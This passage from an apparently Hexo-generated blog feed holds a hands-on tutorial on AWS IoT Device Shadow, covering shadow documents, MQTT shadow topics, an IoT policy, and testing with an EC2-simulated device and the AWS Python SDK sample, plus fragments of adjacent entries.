title="參考文件"></a>參考文件</h2><p>[+] <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning">https://github.com/aws-samples/aws-iot-fleet-provisioning</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based</a><br>[+] <a href="https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/">https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> Certificate </tag>
            
            <tag> Device Provisioning </tag>
            
            <tag> Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: AWS IoT Device Shadow</title>
      <link href="/posts/aws-iot-device-shadow.html"/>
      <url>/posts/aws-iot-device-shadow.html</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-What-is-AWS-IoT-Device-Shadow"><a href="#Intro-What-is-AWS-IoT-Device-Shadow" class="headerlink" title="Intro - What is AWS IoT Device Shadow?"></a>Intro - What is AWS IoT Device Shadow?</h1><p>In real world, sometime it is difficult to get the actual device state in real time in such IoT scenarios.</p><p>A device shadow can overcome this challenge, Device Shadow can consider a virtual  virtual representation of a device which managed by the <strong>IoT Things</strong> resource created in AWS IoT Core.</p><blockquote><p>The Shadow document is a JSON or a JavaScript notation doc that is used to store and retrieve the current state information for a device. You can use the shadow to get and set the state of a device over MQTT topics or HTTP REST APIs, regardless of whether the device is connected to the internet.</p></blockquote><h1 id="Shadow-Document"><a href="#Shadow-Document" class="headerlink" title="Shadow Document"></a>Shadow Document</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Refer to the json above, you can check there 3 <strong>state</strong> properties in shadow document.</p><ul><li>desired<ul><li>Apps specify the desired states of device properties by updating the desired object</li></ul></li><li>reported<ul><li>Devices report their current state in the reported object.</li></ul></li><li>delta<ul><li>AWS IoT reports differences between the desired and the reported state in the delta object.</li></ul></li></ul><blockquote><p>You can consider the flow of Shadow a finite state machine, for AWS IoT Core, it will also check if there are delta event, that means there difference between <strong>Desired</strong> and <strong>Reported</strong> states</p></blockquote><p>So how can we update the state of a shadow?  The answer is clear,</p><blockquote><p><strong>By subscribing&#x2F;publishing messages to the certain MQTT topics</strong></p></blockquote><h1 id="Shadow-Topic"><a href="#Shadow-Topic" class="headerlink" title="Shadow Topic"></a>Shadow Topic</h1><table><thead><tr><th>ShadowTopicPrefix value</th><th>Shadow type</th></tr></thead><tbody><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow</td><td>Unnamed (classic) shadow</td></tr><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow&#x2F;name&#x2F;shadowName</td><td>Named shadow</td></tr></tbody></table><table><thead><tr><th>Topic</th><th>Client operations allowed</th></tr></thead><tbody><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;accepted</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;delta</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;documents</td><td>Subscribe</td></tr></tbody></table><blockquote><p>For detail explanation about these shadow topics, see the documentation - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html</a></p></blockquote><h1 id="The-state-changes-of-Device-Shadow"><a href="#The-state-changes-of-Device-Shadow" class="headerlink" title="The state changes of Device Shadow"></a>The state changes of Device Shadow</h1><p><img src="https://i.imgur.com/l071JEc.png" alt="Imgur"></p><p>Take this picture for example, the update flow is:</p><ol><li>The MQTT client publishes a <code>$aws/things/myLightBulb/shadow/update</code> message to the server. The message carries the desired state <code>&#123;&quot;state&quot;: &#123;&quot;desired&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code></li><li>IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code>, indicating that the update message has been received. At the same time, it publishes <code>$aws/things/myLightBulb/shadow/delta</code> to notify the device to update, and then publishes <code>$aws/things/myLightBulb/shadow/update/document</code> as update record</li><li>After receiving the message, the Device performs the corresponding update operation and publishes a message <code>$aws/things/myLightBulb/shadow/update</code> <code>&#123;&quot;state&quot;&#123;&quot;report&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code> to the IoT Server after completion. Notification updated</li><li>After receiving the post-update message, IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code> to indicate that the update message has been received. Publish another <code>$aws/things/myLightBulb/shadow/update/document</code> as an update record</li></ol><h1 id="Expermient-for-IoT-Shadow"><a href="#Expermient-for-IoT-Shadow" class="headerlink" title="Expermient for IoT Shadow"></a>Expermient for IoT Shadow</h1><h2 id="Device-Setup"><a href="#Device-Setup" class="headerlink" title="Device Setup"></a>Device Setup</h2><p>Since I don’t have any IoT Device currently available, I simulate the device by launching a EC2 instance.</p><ul><li>AMI: <code>Ubuntu 22 LTS</code></li><li>Type: <code>t2.Micro</code></li><li>Subnet: <code>10.1.0.0/24</code></li></ul><p>Then connect to the EC2 instance by using SSH, and run the following command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y python3-pip</span><br><span class="line">mkdir certs/</span><br></pre></td></tr></table></figure><h2 id="Setup-in-AWS-IoT-Core"><a href="#Setup-in-AWS-IoT-Core" class="headerlink" title="Setup in AWS IoT Core"></a>Setup in AWS IoT Core</h2><p>There are 3 things to setup in AWS IoT Core</p><ul><li>Create certificate</li><li>Create IoT Policy and associated with the certificate</li><li>Create Things object and associate with the certificate</li></ul><h3 id="Things"><a href="#Things" class="headerlink" title="Things"></a>Things</h3><p>This is a thing named <code>ESP32</code> for testing purposes, it have associated with the certificate</p><p><img src="https://i.imgur.com/96y4cVz.png" alt="Imgur"></p><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h3><p>And this certificate has issued by the Amazon Root CA.</p><p><img src="https://i.imgur.com/Hg9Jzsv.png" alt="Imgur"></p><p>And there are IoT Policy - <code>TestPolicy</code> asccociate with this certificate.</p><p><em>TestPolicy</em></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:rus-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Remember, this policy must have adequate permissions for <code>CONNECT</code>, <code>SUBSCRIBE</code>, <code>Publish</code> and <code>Publish</code><br>to the Shadow topic.</p><p>Once you have setup these stuff, now I need to convey the certificate to the EC2 instance.</p><p><img src="https://i.imgur.com/LKSyMJw.png" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i &lt;SSH KEY&gt; TestDeviceShadow/*    ubuntu@ec2-&lt;EC2 Public Address&gt;.compute-1.amazonaws.com:/home/ubuntu/certs</span><br></pre></td></tr></table></figure><p>Apart from the device certificate, it is necessary to provide the CA certificate in the device.</p><ul><li>Download the CA Cert in the device</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd certs/</span><br><span class="line">curl -o ~/certs/Amazon-root-CA-1.pem \</span><br><span class="line">    https://www.amazontrust.com/repository/AmazonRootCA1.pem </span><br></pre></td></tr></table></figure><p>Now there all credential we need to test the IoT Device Shadows</p><h2 id="Install-the-IoT-Core-Python-Device-SDK"><a href="#Install-the-IoT-Core-Python-Device-SDK" class="headerlink" title="Install the IoT Core Python Device SDK"></a>Install the IoT Core Python Device SDK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/aws-iot-device-sdk-python-v2/samples</span><br></pre></td></tr></table></figure><h2 id="Execute-the-shadow-py"><a href="#Execute-the-shadow-py" class="headerlink" title="Execute the shadow.py"></a>Execute the shadow.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shadow.py --ca_file ~/certs/Amazon-root-CA-1.pem --cert ~/certs/device.pem.crt --key ~/certs/private.pem.key --endpoint your-iot-endpoint --thing_name your-iot-thing-name</span><br></pre></td></tr></table></figure><blockquote><p>You can derive the iot endpoint by checking the AWS IoT Console<br>Find the <strong>Connect</strong> &gt; <strong>Connect One Device</strong> in the left pane<br>Scroll down and you will see the IoT endpoint</p></blockquote><p><img src="https://i.imgur.com/mDBpV7l.png" alt="Imgur"></p><p>Back to the script, after you execute the <code>shadow.py</code>, you will see the prompt in your terminal</p><p><img src="https://i.imgur.com/necUKaZ.png" alt="Imgur"></p><p>You will need to enter the desired value. So I enter “yellow”.</p><p><img src="https://i.imgur.com/CQOkk83.png" alt="Imgur"></p><p>Then you can observe that the state changed to “yellow”. This results may also observe from the AWS IoT Console</p><blockquote><p>Go to Things, and select your thing object, on the bottem of the target thing page, you can navigate to the <strong>Device Shadow</strong> tab, then select the <strong>Classic Shadow</strong>, then you can see the Device Shadow State below</p></blockquote><p><img src="https://i.imgur.com/KTfooA1.png" alt="Imgur"></p><p><img src="https://i.imgur.com/Xcu4BKk.png" alt="Imgur"></p><p>For testing, I enter “green” as the input of <code>shadow.py</code>.</p><p>And the state change show in both terminal and IoT Console</p><p><img src="https://i.imgur.com/AEEMMCa.png" alt="Imgur"></p><p><img src="https://i.imgur.com/BWi4UZh.png" alt="Imgur"></p><h2 id="Test-the-Shadow-Document"><a href="#Test-the-Shadow-Document" class="headerlink" title="Test the Shadow Document"></a>Test the Shadow Document</h2><p>Now you can try to edit the Shadow Document directly.</p><p>For example, I change the desired state from red to green.</p><p>Then you will notice that the change will reflect to the <strong>Delta report</strong>.</p><p><img src="https://i.imgur.com/9l40PXT.png" alt="Imgur"></p><h2 id="Test-with-AWS-IoT-Test-MQTT-Client"><a href="#Test-with-AWS-IoT-Test-MQTT-Client" class="headerlink" title="Test with AWS IoT Test MQTT Client"></a>Test with AWS IoT Test MQTT Client</h2><p>First, it is necessary to subscribe to the shadow topic in the MQTT client, for receiving the state change events.</p><p><img src="https://i.imgur.com/Zq4x4i8.png" alt="Imgur"></p><p>The client can subscribe to the topic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$aws/things/ESP32/shadow/update/#</span><br></pre></td></tr></table></figure><p>The wildcard symbol <strong>“#”</strong> indicates that it wants to subscribe all topic under the <code>update/</code> prefix.</p><p>And you can re-run the program with new color value. You can find the MQTT client will receive the state change events.</p><p>At first, the color was “red”.</p><blockquote><p>The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;document topic</p></blockquote><p>Then it changed to “green”.</p><blockquote><p> The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted topic<br>Noted that any unsuccessful messages were received on the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;rejected </p></blockquote><p><img src="https://i.imgur.com/brQ3knq.png" alt="Imgur"></p><h2 id="Edit-the-shadow-document-again"><a href="#Edit-the-shadow-document-again" class="headerlink" title="Edit the shadow document again"></a>Edit the shadow document again</h2><p>I change the desired stat value “blue” to “black”.</p><p><img src="https://i.imgur.com/DVKi6Xb.png" alt="Imgur"></p><p>The first received event will be on the delta topic, it means that there are differences between desired state and reported state.</p><p>At the same time, the message will published to the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted for notifying the device to update the state</p><p><img src="https://i.imgur.com/7fewMie.png" alt="Imgur"></p><p>And also published to the shadow document topic for recording.</p><p><img src="https://i.imgur.com/FYULN43.png" alt="Imgur"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;previous&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;current&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">21</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>But the reported state is not “Black”.</p><p>you can see the event published to the accepted topic.</p><p><img src="https://i.imgur.com/pzVidVy.png" alt="Imgur"></p><p>Meanwhile, the message published to the document topic</p><p><img src="https://i.imgur.com/ZKmF0vG.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>You will found the state change from <strong>(Desired: “Blue”, Reported: “Blue”)</strong> to <strong>(Desired: “Black”, Reported: “Blue”)</strong> and the final state is <strong>(Desired: “Black”, Reported: “Black”)</strong>.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[+] Create a virtual device with Amazon EC2 - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html">https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html</a><br>[+] Tutorial: Provisioning your device in AWS IoT - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html">https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html</a><br>[+] Tutorial: Installing the Device SDK and running the sample application for Device Shadows - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html">https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html</a><br>[+] Tutorial: Interacting with Device Shadow using the sample app and the MQTT test client - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html">https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html</a><br>[+] Reserved topics - Shadow topics - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow">https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> IoT Shadow </tag>
            
            <tag> MQTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: Amazon SNS Fan out to Amazon SQS</title>
      <link href="/posts/efc78ef4.html"/>
      <url>/posts/efc78ef4.html</url>
      
